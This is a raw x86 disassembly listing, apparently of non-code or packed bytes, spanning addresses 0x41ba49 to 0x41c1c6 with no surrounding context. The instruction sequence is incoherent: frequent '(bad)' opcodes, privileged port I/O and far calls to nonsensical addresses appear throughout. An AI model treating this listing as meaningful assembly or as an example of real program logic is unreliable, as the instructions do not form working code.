  41ba49:	or     BYTE PTR [ecx+eiz*1+0x7bfc2011],bl
  41ba50:	pop    ebx
  41ba51:	std    
  41ba52:	js     0x41b9de
  41ba54:	jo     0x41bace
  41ba56:	sub    eax,0xfbfcc4ed
  41ba5b:	aad    0x9c
  41ba5d:	dec    ecx
  41ba5e:	and    esp,DWORD PTR [esi-0x6d]
  41ba61:	in     eax,dx
  41ba62:	sahf   
  41ba63:	fcomi  st,st(2)
  41ba65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba66:	daa    
  41ba67:	aas    
  41ba68:	sub    eax,0xc1ea43cc
  41ba6d:	pushf  
  41ba6e:	adc    DWORD PTR [ecx-0x40b04dcb],edx
  41ba74:	mov    ah,0xea
  41ba76:	lods   eax,DWORD PTR ds:[esi]
  41ba77:	xchg   edx,eax
  41ba78:	(bad)  
  41ba79:	lea    edi,[eax+0x40c2565c]
  41ba7f:	in     al,0xd2
  41ba81:	sub    eax,0x46d82781
  41ba86:	test   al,0x34
  41ba88:	adc    BYTE PTR [ebp-0xba9cde8],cl
  41ba8e:	and    BYTE PTR [bp-0xdcf],dh
  41ba93:	fist   WORD PTR [ebx]
  41ba95:	sti    
  41ba96:	xchg   ebx,eax
  41ba97:	jp     0x41ba78
  41ba99:	rcl    DWORD PTR ds:0x5261a1b0,cl
  41ba9f:	inc    edi
  41baa0:	retf   
  41baa1:	leave  
  41baa2:	ins    BYTE PTR es:[edi],dx
  41baa3:	sbb    DWORD PTR [ebp-0x2],ecx
  41baa6:	cmp    al,0x67
  41baa8:	and    bh,BYTE PTR [ebx+0x56]
  41baab:	pop    ss
  41baac:	mov    bl,0xab
  41baae:	jae    0x41ba7b
  41bab0:	sbb    eax,0x5d0e2cc7
  41bab5:	adc    BYTE PTR [edi-0x2ff4a8b7],ch
  41babb:	mov    gs,WORD PTR [esi-0x6c]
  41babe:	(bad)  
  41babf:	dec    ebp
  41bac0:	lahf   
  41bac1:	jp     0x41bb12
  41bac3:	mov    ecx,0xdc486555
  41bac8:	loop   0x41ba88
  41baca:	pushf  
  41bacb:	sub    al,0xd2
  41bacd:	pop    esi
  41bace:	adc    BYTE PTR [ebp+eax*8+0x6e0408d4],cl
  41bad5:	loop   0x41badf
  41bad7:	mov    eax,0xba7f2850
  41badc:	rcl    BYTE PTR [ebx+0xf],1
  41badf:	mov    ds:0x1e37319d,eax
  41bae4:	lahf   
  41bae5:	xor    ch,ch
  41bae7:	(bad)  
  41bae9:	push   ebx
  41baea:	xor    BYTE PTR [ecx-0x36],bl
  41baed:	or     DWORD PTR [edi],esp
  41baef:	push   eax
  41baf0:	ins    DWORD PTR es:[edi],dx
  41baf1:	mov    ds:0xcd177c62,eax
  41baf6:	pushf  
  41baf7:	test   BYTE PTR [edx],dh
  41baf9:	pusha  
  41bafa:	jbe    0x41baaf
  41bafc:	sbb    eax,DWORD PTR [edx]
  41bafe:	lds    ebp,FWORD PTR ss:[esi+0x1e]
  41bb02:	rcl    DWORD PTR [edx+eiz*4-0x7cafc43c],1
  41bb09:	jae    0x41bb2a
  41bb0b:	xchg   edi,eax
  41bb0c:	cmp    al,BYTE PTR ds:0xb0b0e17d
  41bb12:	mov    cl,0xf2
  41bb14:	sbb    ah,BYTE PTR [esi+0x743413d3]
  41bb1a:	loope  0x41bb33
  41bb1c:	icebp  
  41bb1d:	call   0xf5f31885
  41bb22:	loope  0x41bb06
  41bb24:	sbb    DWORD PTR [edx+0xdefcc79],0xc
  41bb2b:	mov    edi,0x5daefa89
  41bb30:	loopne 0x41bad4
  41bb32:	lock and cl,BYTE PTR [esi+0x6d816bf6]
  41bb39:	mov    ds:0x59931763,al
  41bb3e:	dec    edi
  41bb3f:	(bad)  
  41bb40:	dec    esp
  41bb41:	cwde   
  41bb42:	or     al,0x1c
  41bb44:	jne    0x41bb47
  41bb46:	dec    edx
  41bb47:	ror    DWORD PTR [ebx],0x67
  41bb4a:	popa   
  41bb4b:	adc    al,0x4d
  41bb4d:	xchg   ecx,eax
  41bb4e:	sub    ebp,DWORD PTR [ebx+0x5ed61eee]
  41bb54:	outs   dx,DWORD PTR ds:[esi]
  41bb55:	push   esi
  41bb56:	data16 in al,0xf8
  41bb59:	pop    esp
  41bb5a:	mov    ebx,0x7c4a2375
  41bb5f:	dec    esp
  41bb60:	mov    ds:0x27e4264e,al
  41bb65:	sbb    al,0x9c
  41bb67:	out    dx,al
  41bb68:	mov    bh,0x54
  41bb6a:	pop    ebp
  41bb6b:	jnp    0x41bb3f
  41bb6d:	cld    
  41bb6e:	lds    ecx,FWORD PTR [ebp+0x4b]
  41bb71:	loope  0x41bbd8
  41bb73:	jb     0x41bb30
  41bb75:	push   esi
  41bb76:	call   0x1976193f
  41bb7b:	adc    edx,DWORD PTR fs:[edx+0x3b56948]
  41bb82:	add    DWORD PTR [esi+0x13],edx
  41bb85:	in     eax,0x98
  41bb87:	lock fstp st(4)
  41bb8a:	pusha  
  41bb8b:	outs   dx,DWORD PTR ds:[esi]
  41bb8c:	rcr    BYTE PTR [ecx+0x6f77878],cl
  41bb92:	xchg   ebp,eax
  41bb93:	iret   
  41bb94:	xchg   ebx,eax
  41bb95:	(bad)  
  41bb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb97:	sub    al,0x21
  41bb99:	shl    DWORD PTR [ebp-0x45],cl
  41bb9c:	test   eax,0xd497c0dc
  41bba1:	cld    
  41bba2:	enter  0x5dd0,0xad
  41bba6:	bound  ebp,QWORD PTR [edx]
  41bba8:	xor    DWORD PTR [eax+0x69],0x61174017
  41bbaf:	mov    al,ds:0xb3c11721
  41bbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb5:	rcl    BYTE PTR [edx+0x66],0x72
  41bbb9:	or     DWORD PTR [esi+edx*2-0x36],esi
  41bbbd:	(bad)  
  41bbbe:	push   ebx
  41bbbf:	xor    edi,ebx
  41bbc1:	es clc 
  41bbc3:	aas    
  41bbc4:	rcr    BYTE PTR [eax+0x25c03f82],1
  41bbca:	dec    esi
  41bbcb:	push   esi
  41bbcc:	repz mov esi,0x1a558f26
  41bbd2:	mov    al,ds:0xe1ac2dcb
  41bbd7:	fdivp  st(5),st
  41bbd9:	adc    eax,0x17651c1a
  41bbde:	out    dx,eax
  41bbdf:	fcom   QWORD PTR [ebp-0x9203dd5]
  41bbe5:	mov    ebx,0xb31b0491
  41bbea:	mov    ecx,0xb8093c58
  41bbef:	adc    cl,BYTE PTR [ebp+0x50]
  41bbf2:	out    0x29,eax
  41bbf4:	mov    ds:0xef2c268b,eax
  41bbf9:	retf   0x11c5
  41bbfc:	cmp    esp,ebp
  41bbfe:	arpl   sp,sp
  41bc00:	xor    al,0x38
  41bc02:	shl    edi,0x5b
  41bc05:	popf   
  41bc06:	jbe    0x41bc23
  41bc08:	aam    0xd5
  41bc0a:	into   
  41bc0b:	or     DWORD PTR [esi],ebx
  41bc0d:	sub    ecx,DWORD PTR [edi]
  41bc0f:	ret    
  41bc10:	xor    eax,DWORD PTR [eax]
  41bc12:	test   eax,0xa810b196
  41bc17:	in     eax,0x6d
  41bc19:	sub    eax,0xb1eedce8
  41bc1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc1f:	retf   
  41bc20:	or     BYTE PTR [eax+esi*1+0x46b445a],0x80
  41bc28:	iret   
  41bc29:	imul   ebx,esi,0x686e4895
  41bc2f:	push   ecx
  41bc30:	push   edx
  41bc31:	in     al,0xa
  41bc33:	test   BYTE PTR [ecx-0x283c1f27],bh
  41bc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc3a:	dec    esp
  41bc3b:	fdivr  QWORD PTR [esi-0x2f]
  41bc3e:	and    dl,0xd1
  41bc41:	ins    DWORD PTR es:[edi],dx
  41bc42:	fild   QWORD PTR [edi-0x25]
  41bc45:	mov    bh,0x63
  41bc47:	inc    ecx
  41bc48:	pop    edx
  41bc49:	cmc    
  41bc4a:	jecxz  0x41bbf1
  41bc4c:	and    al,0xe2
  41bc4e:	std    
  41bc4f:	(bad)
  41bc52:	aas    
  41bc53:	add    BYTE PTR [edi],al
  41bc55:	hlt    
  41bc56:	mov    al,ds:0x6bb8c1cd
  41bc5b:	(bad)  
  41bc5c:	mov    WORD PTR [edx+0xf],es
  41bc5f:	scas   al,BYTE PTR es:[edi]
  41bc60:	and    bh,dl
  41bc62:	or     al,0x5
  41bc64:	cwde   
  41bc65:	push   eax
  41bc66:	into   
  41bc67:	or     al,0xd6
  41bc69:	(bad)  
  41bc6a:	mov    ds,WORD PTR [ebp-0xe]
  41bc6d:	das    
  41bc6e:	loope  0x41bcd1
  41bc70:	push   edx
  41bc71:	test   BYTE PTR [ecx+eiz*8-0x78cc0ea2],cl
  41bc78:	out    dx,eax
  41bc79:	ret    
  41bc7a:	dec    eax
  41bc7b:	xor    edx,DWORD PTR [edx-0x33bbf8d5]
  41bc81:	(bad)  
  41bc82:	call   0xa38e:0xc139eeca
  41bc89:	mov    eax,ds:0x802f0a50
  41bc8e:	push   eax
  41bc8f:	cmp    BYTE PTR [edi-0x60d7c3ba],ah
  41bc95:	jecxz  0x41bcde
  41bc97:	xor    eax,0xec1fa9a5
  41bc9c:	sub    bl,bh
  41bc9e:	mov    ch,0xdc
  41bca0:	pop    ss
  41bca1:	int    0x7f
  41bca3:	adc    ah,BYTE PTR [esi+0x2b]
  41bca6:	pop    edi
  41bca7:	xchg   esp,eax
  41bca8:	adc    BYTE PTR [ebp+0x2d],cl
  41bcab:	test   DWORD PTR [esi+edi*8-0x5c1521aa],edx
  41bcb2:	lods   eax,DWORD PTR ds:[esi]
  41bcb3:	sti    
  41bcb4:	imul   edx,DWORD PTR [edi],0xe4d4d127
  41bcba:	nop
  41bcbb:	cmp    BYTE PTR [ebp+ebp*1+0x17],ah
  41bcbf:	imul   esp,DWORD PTR [edx+0x5a],0x2aa23a46
  41bcc6:	lods   al,BYTE PTR ds:[esi]
  41bcc7:	into   
  41bcc8:	dec    ebp
  41bcc9:	sub    BYTE PTR [ecx-0x3d58a911],dh
  41bccf:	pop    es
  41bcd0:	or     esi,DWORD PTR [ecx]
  41bcd2:	sbb    cl,BYTE PTR [ebp-0x53469f93]
  41bcd8:	sub    ch,BYTE PTR [ebx+0x27]
  41bcdb:	mov    al,ds:0xbcbd7c6a
  41bce0:	xchg   ecx,eax
  41bce1:	outs   dx,DWORD PTR ds:[esi]
  41bce2:	mov    edx,DWORD PTR [esi+ebp*2]
  41bce5:	ret    
  41bce6:	mov    ebp,esi
  41bce8:	push   ebx
  41bce9:	mov    edi,0x6da38b3
  41bcee:	call   0xa87981bb
  41bcf3:	add    DWORD PTR [ebx],edx
  41bcf5:	retf   
  41bcf6:	in     eax,0x7a
  41bcf8:	ror    esi,cl
  41bcfa:	imul   ecx,DWORD PTR [edi],0xa
  41bcfd:	mov    al,ds:0xcdf601aa
  41bd02:	mov    esp,0x6617bea1
  41bd07:	push   edi
  41bd08:	sbb    eax,0x3b8d78f1
  41bd0d:	aas    
  41bd0e:	lock je 0x41bc93
  41bd11:	pushf  
  41bd12:	popf   
  41bd13:	rcr    BYTE PTR ds:0x1243df75,cl
  41bd19:	sti    
  41bd1a:	test   DWORD PTR [edx-0x6a],edi
  41bd1d:	inc    ebp
  41bd1e:	add    edx,DWORD PTR [ecx]
  41bd20:	and    cl,BYTE PTR [ebx-0x4523e3f2]
  41bd26:	adc    eax,0xe6a1a63
  41bd2b:	and    bh,BYTE PTR [eax-0x8]
  41bd2e:	pop    esp
  41bd2f:	pop    es
  41bd30:	fs icebp 
  41bd32:	sub    ch,dl
  41bd34:	int3   
  41bd35:	inc    edx
  41bd36:	test   DWORD PTR gs:[eax-0xf],ecx
  41bd3a:	in     eax,dx
  41bd3b:	mov    esi,0x3a92d251
  41bd40:	retf   0x4794
  41bd43:	mov    esp,0x7638f1de
  41bd48:	clc    
  41bd49:	adc    al,0xd
  41bd4b:	push   edx
  41bd4c:	jbe    0x41bd1e
  41bd4e:	mov    bh,0x8c
  41bd50:	sbb    al,0x74
  41bd52:	xchg   ebx,eax
  41bd53:	lods   al,BYTE PTR ds:[esi]
  41bd54:	test   DWORD PTR [edi+eax*4+0x15],edi
  41bd58:	xchg   ebx,eax
  41bd59:	xor    esp,DWORD PTR [eax-0x34]
  41bd5c:	dec    edx
  41bd5d:	(bad)  
  41bd5e:	adc    DWORD PTR [edi+0x4574d2e1],edx
  41bd64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd65:	and    al,BYTE PTR [eax-0x5a]
  41bd68:	das    
  41bd69:	and    esi,DWORD PTR [edi]
  41bd6b:	jmp    0x892acca
  41bd70:	lods   al,BYTE PTR ds:[esi]
  41bd71:	mov    eax,0x7785164f
  41bd76:	mov    fs,WORD PTR [ecx]
  41bd78:	adc    ah,BYTE PTR [eax+0x36841aab]
  41bd7e:	fs push edi
  41bd80:	jmp    0x41bdf7
  41bd82:	xchg   ebx,eax
  41bd83:	push   ss
  41bd84:	pusha  
  41bd85:	xchg   ebx,eax
  41bd86:	(bad)  
  41bd87:	jns    0x41bd50
  41bd89:	push   edx
  41bd8a:	dec    eax
  41bd8b:	fcom   st(6)
  41bd8d:	push   cs
  41bd8e:	push   edx
  41bd8f:	or     BYTE PTR [edi],0xb4
  41bd92:	retf   0xb99d
  41bd95:	pop    edi
  41bd96:	mov    ebp,0x1daba378
  41bd9b:	mov    al,ds:0xd2244881
  41bda0:	cmp    BYTE PTR [edx-0x1db8fdc4],ah
  41bda6:	aaa    
  41bda7:	pop    ecx
  41bda8:	push   ebx
  41bda9:	and    eax,0x2b9a98a4
  41bdae:	and    eax,0xff1ffd0b
  41bdb3:	xor    bl,0x88
  41bdb6:	repnz mov ebp,0x378e5959
  41bdbc:	(bad)  
  41bdbe:	pop    eax
  41bdbf:	ret    
  41bdc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc1:	jns    0x41bdca
  41bdc3:	add    DWORD PTR [ebx-0x2b],0xe74ee473
  41bdca:	jnp    0x41be35
  41bdcc:	or     eax,DWORD PTR [edx]
  41bdce:	xor    BYTE PTR [edx+ebp*4+0x37ea5ca4],dh
  41bdd5:	mov    edi,0xef00273d
  41bdda:	jle    0x41be0c
  41bddc:	std    
  41bddd:	jae    0x41be0c
  41bddf:	push   edx
  41bde0:	sub    ebp,DWORD PTR [edi+0x26b45948]
  41bde6:	dec    edi
  41bde7:	add    ecx,DWORD PTR [esi+0x2b]
  41bdea:	in     al,0xef
  41bdec:	sbb    esp,eax
  41bdee:	mov    bl,0x1
  41bdf0:	cld    
  41bdf1:	stos   DWORD PTR es:[edi],eax
  41bdf2:	xchg   esi,eax
  41bdf3:	sti    
  41bdf4:	dec    ebp
  41bdf5:	add    ecx,eax
  41bdf7:	cmp    eax,ebp
  41bdf9:	dec    ebx
  41bdfa:	loop   0x41be1e
  41bdfc:	or     ebx,DWORD PTR [edi]
  41bdfe:	pushf  
  41bdff:	push   ebx
  41be00:	or     DWORD PTR [ecx],edi
  41be02:	xor    eax,0x7806a658
  41be07:	clc    
  41be08:	lds    edi,FWORD PTR [ecx-0x6e3639d]
  41be0e:	inc    ecx
  41be0f:	enter  0x44b,0xe4
  41be13:	cmovle ecx,ebp
  41be16:	les    ebx,FWORD PTR [ebx]
  41be18:	(bad)  
  41be19:	mov    al,0x3d
  41be1b:	in     al,dx
  41be1c:	and    edi,DWORD PTR [ebx+0x9]
  41be1f:	jb     0x41be6d
  41be21:	jg     0x41be19
  41be23:	fld    st(5)
  41be25:	push   0xffffffc7
  41be27:	pusha  
  41be28:	data16 daa 
  41be2a:	push   esp
  41be2b:	jecxz  0x41be94
  41be2d:	mov    ah,BYTE PTR [edi-0x4e]
  41be30:	and    DWORD PTR [edx+esi*8-0x47cec572],esp
  41be37:	xchg   DWORD PTR [ecx+0x54],eax
  41be3a:	cmc    
  41be3b:	sbb    edx,DWORD PTR [edi+ebx*1]
  41be3e:	adc    BYTE PTR [edi],0x6
  41be41:	inc    edi
  41be42:	mov    WORD PTR [ecx],?
  41be44:	push   edi
  41be45:	fsubr  st(4),st
  41be47:	std    
  41be48:	sti    
  41be49:	aaa    
  41be4a:	out    dx,eax
  41be4b:	cmp    ah,al
  41be4d:	and    BYTE PTR [esi+edx*1+0x4264d612],bh
  41be54:	(bad)  
  41be55:	xor    eax,0x9cd7376c
  41be5a:	in     eax,0x6f
  41be5c:	das    
  41be5d:	push   0xf805e76e
  41be62:	std    
  41be63:	imul   ebp,ebx,0x45929d87
  41be69:	cwde   
  41be6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be6b:	sub    DWORD PTR ds:0x9006c102,ebp
  41be71:	xor    eax,0xb585e8bb
  41be76:	xchg   DWORD PTR [ebp-0x49],ebx
  41be79:	enter  0x6714,0xe
  41be7d:	or     al,0x99
  41be7f:	add    edx,DWORD PTR [esi+ebx*4]
  41be82:	xor    dh,dl
  41be84:	xchg   esp,eax
  41be85:	mov    ah,0x7a
  41be87:	push   ss
  41be88:	retf   
  41be89:	pop    ds
  41be8a:	pop    ss
  41be8b:	inc    eax
  41be8c:	mov    eax,ds:0xfb4ea9f2
  41be91:	inc    edi
  41be92:	jbe    0x41beb9
  41be94:	mov    bl,0xcb
  41be96:	cli    
  41be97:	or     al,0xde
  41be99:	clc    
  41be9a:	jmp    0x3695b342
  41be9f:	mov    dh,0xa0
  41bea1:	pop    edx
  41bea2:	jns    0x41bed8
  41bea4:	mov    bl,0x66
  41bea6:	int    0x2d
  41bea8:	inc    ebp
  41bea9:	cmp    eax,0x51a545cf
  41beae:	sbb    eax,0x7e2fe498
  41beb3:	jecxz  0x41be4c
  41beb5:	clc    
  41beb6:	jo     0x41bf04
  41beb8:	sti    
  41beb9:	dec    BYTE PTR [ecx+0x71]
  41bebc:	xlat   BYTE PTR ds:[ebx]
  41bebd:	(bad)  
  41bebe:	les    ecx,FWORD PTR [edi+ecx*8+0x3d]
  41bec2:	or     eax,0x7a2a303b
  41bec7:	and    DWORD PTR [eax-0x6e71c394],ebp
  41becd:	inc    ebp
  41bece:	mov    edi,0xf4e94c1a
  41bed3:	adc    ebx,ebp
  41bed5:	xchg   ebx,eax
  41bed6:	mov    cl,BYTE PTR [ebx+ebx*4]
  41bed9:	(bad)  
  41beda:	pop    esp
  41bedb:	iret   
  41bedc:	mov    WORD PTR [eax],?
  41bede:	pop    edi
  41bedf:	int3   
  41bee0:	popf   
  41bee1:	or     eax,0x6abede90
  41bee6:	fistp  DWORD PTR [eax-0x36]
  41bee9:	neg    bh
  41beeb:	(bad)
  41beef:	push   ds
  41bef0:	add    DWORD PTR [ecx+eax*8],edx
  41bef3:	push   edx
  41bef4:	addr16 mov ebp,0xdb446f5e
  41befa:	lahf   
  41befb:	xchg   ecx,eax
  41befc:	and    DWORD PTR [ecx],0xee425157
  41bf02:	jmp    0x41bf27
  41bf04:	dec    ebp
  41bf05:	mov    bh,0x25
  41bf07:	mov    al,ds:0xb6d78a77
  41bf0c:	jbe    0x41bf2b
  41bf0e:	ret    
  41bf0f:	call   0x564001ec
  41bf14:	and    al,0xe8
  41bf16:	out    dx,eax
  41bf17:	icebp  
  41bf18:	sahf   
  41bf19:	iret   
  41bf1a:	cmp    al,BYTE PTR [ecx]
  41bf1c:	repz mov dh,0x5f
  41bf1f:	jo     0x41bf3a
  41bf21:	(bad)  
  41bf22:	shl    BYTE PTR [ebp+0x1be126ae],cl
  41bf28:	les    ebx,FWORD PTR ss:[edi-0x59]
  41bf2c:	cmp    DWORD PTR [edx+0x5ae4a415],ebp
  41bf32:	push   ss
  41bf33:	push   0xffffff8e
  41bf35:	add    al,0x1d
  41bf37:	cwde   
  41bf38:	adc    esi,esi
  41bf3a:	fcomi  st,st(2)
  41bf3c:	push   cs
  41bf3d:	les    esp,FWORD PTR [edx+0x2cb4e6bd]
  41bf43:	cmp    dl,BYTE PTR [edi]
  41bf45:	aam    0x1b
  41bf47:	imul   ebx,DWORD PTR [ebp-0x21],0x65
  41bf4b:	leave  
  41bf4c:	push   0x3356186e
  41bf51:	cmp    al,0xbb
  41bf53:	int    0xd3
  41bf55:	in     al,dx
  41bf56:	test   al,0xfa
  41bf58:	adc    al,0x60
  41bf5a:	mov    edx,0xaba5792f
  41bf5f:	push   ebp
  41bf60:	ja     0x41bf93
  41bf62:	clc    
  41bf63:	jne    0x41bfbf
  41bf65:	dec    ebp
  41bf66:	int    0xea
  41bf68:	sbb    BYTE PTR [ebp-0x5c90ba54],bh
  41bf6e:	mov    ch,0x5b
  41bf70:	scas   eax,DWORD PTR es:[edi]
  41bf71:	retf   0xfe39
  41bf74:	repz pop ss
  41bf76:	inc    ecx
  41bf77:	sbb    ebp,0xffffff9d
  41bf7a:	ins    DWORD PTR es:[edi],dx
  41bf7b:	fwait
  41bf7c:	mov    ds:0xe66e02d1,al
  41bf81:	or     bl,dh
  41bf83:	cs das 
  41bf85:	push   0xfffffff6
  41bf87:	cld    
  41bf88:	neg    BYTE PTR [ecx+0x3]
  41bf8b:	jecxz  0x41bf63
  41bf8d:	icebp  
  41bf8e:	pop    ds
  41bf8f:	pop    edx
  41bf90:	or     cl,BYTE PTR [ebx+0x5984a1c3]
  41bf96:	pop    ebx
  41bf97:	mov    esi,0xaf50a14c
  41bf9c:	imul   ebp,DWORD PTR [eax-0x29],0xd18eb2f9
  41bfa3:	loope  0x41bf46
  41bfa5:	ds pop edx
  41bfa7:	mov    esi,0x797c5e91
  41bfac:	cld    
  41bfad:	cmp    DWORD PTR [ebp-0x64],0xfaa52024
  41bfb4:	cs pushf 
  41bfb6:	xchg   esi,eax
  41bfb7:	lds    ecx,FWORD PTR [esi]
  41bfb9:	adc    bl,0xfd
  41bfbc:	ja     0x41bfa2
  41bfbe:	or     ebx,DWORD PTR [edx]
  41bfc0:	push   ebp
  41bfc1:	call   0x822a:0xdab52225
  41bfc8:	push   eax
  41bfc9:	cmp    ecx,DWORD PTR [esi]
  41bfcb:	cmp    cl,ch
  41bfcd:	pop    ebx
  41bfce:	(bad)  
  41bfcf:	push   ebx
  41bfd0:	fldl2e 
  41bfd2:	mov    esp,0x74c34410
  41bfd7:	xchg   ecx,eax
  41bfd8:	mul    DWORD PTR [eax]
  41bfda:	sub    al,0xa
  41bfdc:	inc    edi
  41bfdd:	mov    ah,0xbc
  41bfdf:	les    edi,FWORD PTR [esi+0x8957ef]
  41bfe5:	mov    eax,ds:0x5154fc60
  41bfea:	stos   DWORD PTR es:[edi],eax
  41bfeb:	aam    0x49
  41bfed:	mov    bl,0xc4
  41bfef:	pop    ecx
  41bff0:	cwde   
  41bff1:	cli    
  41bff2:	sbb    eax,0xbe3f8030
  41bff7:	mov    ecx,0x7bdeb09b
  41bffc:	daa    
  41bffd:	mov    WORD PTR [edi],ds
  41bfff:	jns    0x41c014
  41c001:	cmc    
  41c002:	aam    0xb0
  41c004:	push   0x51aa7a3c
  41c009:	cmp    BYTE PTR [esi+ebp*2+0x61d40dfd],dl
  41c010:	icebp  
  41c011:	dec    ecx
  41c012:	pushf  
  41c013:	pop    es
  41c014:	loopne 0x41c043
  41c016:	push   ss
  41c017:	aaa    
  41c018:	fcmovnb st,st(5)
  41c01a:	mov    edi,0xcbf090e9
  41c01f:	into   
  41c020:	imul   ebx,ebp,0xdf1b0b55
  41c026:	ror    DWORD PTR [ebx+0x633a0de8],0xe7
  41c02d:	lods   al,BYTE PTR ds:[esi]
  41c02e:	jle    0x41c046
  41c030:	dec    edi
  41c031:	xchg   edi,eax
  41c032:	xor    al,0xb6
  41c035:	jno    0x41bffa
  41c037:	loop   0x41bffe
  41c039:	fld    QWORD PTR [edx+edi*1-0x3b]
  41c03d:	or     DWORD PTR [ebp+0x41a9d3af],edx
  41c043:	dec    ebp
  41c044:	mov    esp,0xd89bf5ee
  41c049:	enter  0x610e,0xb8
  41c04d:	jg     0x41bfe0
  41c04f:	mov    al,ds:0xe8370d6f
  41c054:	mov    ds:0x508a91f5,eax
  41c059:	out    dx,al
  41c05a:	icebp  
  41c05b:	mov    ebx,0x3144eb32
  41c060:	dec    eax
  41c061:	xchg   ecx,eax
  41c062:	cmc    
  41c063:	retf   0x5dcc
  41c066:	setle  BYTE PTR [esi+0x5f]
  41c06a:	repz cmc 
  41c06c:	add    BYTE PTR [edi],0x2e
  41c06f:	pop    edx
  41c070:	retf   0xe569
  41c073:	pushf  
  41c074:	popa   
  41c075:	xchg   edi,eax
  41c076:	stos   BYTE PTR es:[edi],al
  41c077:	lea    esi,[ecx-0x53de9559]
  41c07d:	xchg   esi,eax
  41c07e:	cmp    ecx,eax
  41c080:	ds pop esi
  41c082:	in     al,0xa4
  41c084:	mov    cs,WORD PTR [edi+0x61]
  41c087:	out    dx,al
  41c088:	imul   edi,DWORD PTR [eax],0xffffff85
  41c08b:	jns    0x41c0d4
  41c08d:	cmp    dh,BYTE PTR [ebp-0x1df2ecc7]
  41c093:	rol    ah,1
  41c095:	pop    esi
  41c096:	scas   eax,DWORD PTR es:[edi]
  41c097:	es nop
  41c099:	ret    0xc9
  41c09c:	add    BYTE PTR [ebx+0x12573a62],ch
  41c0a2:	sbb    eax,0xc716bdc2
  41c0a7:	(bad)  
  41c0a8:	das    
  41c0a9:	shl    DWORD PTR [edi+0x51],1
  41c0ac:	push   cs
  41c0ad:	pop    ebp
  41c0ae:	or     ebp,ebx
  41c0b0:	inc    esi
  41c0b1:	lods   al,BYTE PTR ds:[esi]
  41c0b2:	ins    BYTE PTR es:[edi],dx
  41c0b3:	pop    ebx
  41c0b4:	jg     0x41c042
  41c0b6:	mov    esp,0x56d87131
  41c0bb:	sub    eax,0xec2ba075
  41c0c0:	test   eax,0x24f92f9
  41c0c5:	sahf   
  41c0c6:	imul   edx,DWORD PTR [edx],0x2f
  41c0c9:	(bad)  [edi+eax*1-0x4d]
  41c0cd:	rol    BYTE PTR [ebp-0x36],1
  41c0d0:	test   BYTE PTR [edx+0x3a2a0a41],ah
  41c0d6:	sub    esp,DWORD PTR [edx+0x296961a3]
  41c0dc:	retf   0xd00c
  41c0df:	mov    ebp,DWORD PTR [eax-0xadc5cea]
  41c0e5:	je     0x41c078
  41c0e7:	addr16 cwde 
  41c0e9:	xchg   DWORD PTR [eax+0x11],ebx
  41c0ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ed:	xor    eax,0x31803d23
  41c0f2:	cdq    
  41c0f3:	xchg   ecx,eax
  41c0f4:	jmp    0xb82b:0x24e42702
  41c0fb:	xchg   BYTE PTR es:[ebp-0x49eda28c],dl
  41c102:	in     eax,dx
  41c103:	mov    cl,BYTE PTR [esi]
  41c105:	add    DWORD PTR [ecx-0x6fc457f6],0x47
  41c10c:	iret   
  41c10d:	push   esp
  41c10e:	cdq    
  41c10f:	out    dx,eax
  41c110:	xor    BYTE PTR [ecx+ecx*4],ah
  41c113:	dec    edi
  41c114:	call   0x37bf:0x7cb28acd
  41c11b:	imul   esi,DWORD PTR [ebp+eiz*8-0x792aca11],0xffffff8c
  41c123:	das    
  41c124:	in     al,dx
  41c125:	pop    ebp
  41c126:	jno    0x41c179
  41c128:	mov    ds:0xdd7a91b,al
  41c12d:	and    DWORD PTR [edx+0x43],esp
  41c130:	xor    DWORD PTR [ebx+edi*2],esi
  41c133:	mov    dl,0x7c
  41c135:	rcr    bl,1
  41c137:	jmp    0x5fb06848
  41c13c:	cmp    cl,dh
  41c13e:	sbb    DWORD PTR [ecx-0x3f],esi
  41c141:	mov    esp,0x79ee9b4d
  41c146:	mov    bh,0xe8
  41c148:	or     DWORD PTR [ecx+eax*8],ebp
  41c14b:	sti    
  41c14c:	cwde   
  41c14d:	retf   
  41c14e:	mov    cl,0xd7
  41c150:	inc    cx
  41c152:	xor    eax,0xcdfe7e3e
  41c157:	and    ch,dl
  41c159:	das    
  41c15a:	pop    ecx
  41c15b:	arpl   WORD PTR [edx],sp
  41c15d:	inc    ebx
  41c15e:	inc    edx
  41c15f:	push   ss
  41c160:	jbe    0x41c14f
  41c162:	cdq    
  41c163:	sub    edx,DWORD PTR [edx-0x5a]
  41c166:	jno    0x41c184
  41c168:	adc    cl,BYTE PTR [ecx]
  41c16a:	jp     0x41c15f
  41c16c:	call   0x219e:0x287cba2d
  41c173:	sbb    eax,0x5aaa2d80
  41c178:	data16 mov WORD PTR [edi-0x2b],ss
  41c17c:	mov    ch,0x7f
  41c17e:	cs jecxz 0x41c192
  41c181:	repnz mov cl,0x29
  41c184:	das    
  41c185:	or     BYTE PTR [edx],cl
  41c187:	icebp  
  41c188:	jg     0x41c18c
  41c18a:	ins    BYTE PTR es:[edi],dx
  41c18b:	xchg   edx,eax
  41c18c:	cwde   
  41c18d:	iret   
  41c18e:	ins    BYTE PTR es:[edi],dx
  41c18f:	rol    BYTE PTR [edx-0x44],1
  41c192:	mov    dl,0xc4
  41c194:	ret    0x7610
  41c197:	fucomip st,st(5)
  41c199:	stos   DWORD PTR es:[edi],eax
  41c19a:	into   
  41c19b:	sub    al,0xe5
  41c19d:	inc    ecx
  41c19e:	inc    ebp
  41c19f:	ds pop esp
  41c1a1:	enter  0x12ca,0xe8
  41c1a5:	jle    0x41c217
  41c1a7:	cmp    edi,DWORD PTR [ecx]
  41c1a9:	out    dx,al
  41c1aa:	jnp    0x41c14a
  41c1ac:	adc    ah,BYTE PTR [esi-0x6ec54ac0]
  41c1b2:	pusha  
  41c1b3:	pusha  
  41c1b4:	sub    al,al
  41c1b6:	jmp    0xd11a215c
  41c1bb:	inc    eax
  41c1bd:	jmp    0x41c196
  41c1bf:	shl    cl,1
  41c1c1:	mov    ebp,0xbab924c7
  41c1c6:	cmp    ch,dl
